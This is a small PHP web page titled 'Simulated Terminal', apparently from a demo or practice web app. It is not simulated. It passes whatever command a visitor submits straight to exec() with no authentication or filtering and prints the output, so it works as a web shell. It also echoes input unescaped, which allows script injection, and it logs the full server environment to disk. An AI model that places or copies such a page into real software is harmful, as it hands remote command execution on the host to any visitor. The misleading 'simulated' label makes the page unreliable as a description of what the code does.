<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Simulated Terminal</title>
  	<link rel="stylesheet" type="text/css" href="../../css/default.css">
</head>

<body>
	<div>
		<form action="#" method="post" enctype="multipart/form-data">
			<input id="cmd_str" name="cmd_str" value="">
			<label for="cmd_str">Type the command</label><br>
			<input type="submit" value="Submit" name="submit">
		</form>
		<br>
	</div>
	<div>
		<h2>Result:</h2>
		<p>

<?php
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);
	if(isset($_POST["cmd_str"])) {
		$cmd_str = $_POST["cmd_str"];
		echo ">" . $cmd_str . "<br>";
		exec($cmd_str . " 2>&1", $std_out);
		foreach($std_out as $out) {
			echo $out . " <br>";
		}
	}
?>
		</p>
	</div>
</body>
</html>

<?php
	$document_root = $_SERVER['DOCUMENT_ROOT'];
	$log_message_php = "$document_root" . '/apps/utils/log_message.php';
 	include "$log_message_php";
    $path = "$document_root" . "/log/";
	$postfix = basename(__FILE__) . '.SERVER';
	$msg = print_r($_SERVER, TRUE) . "\n";
	log_message($path, $msg, $postfix);
?>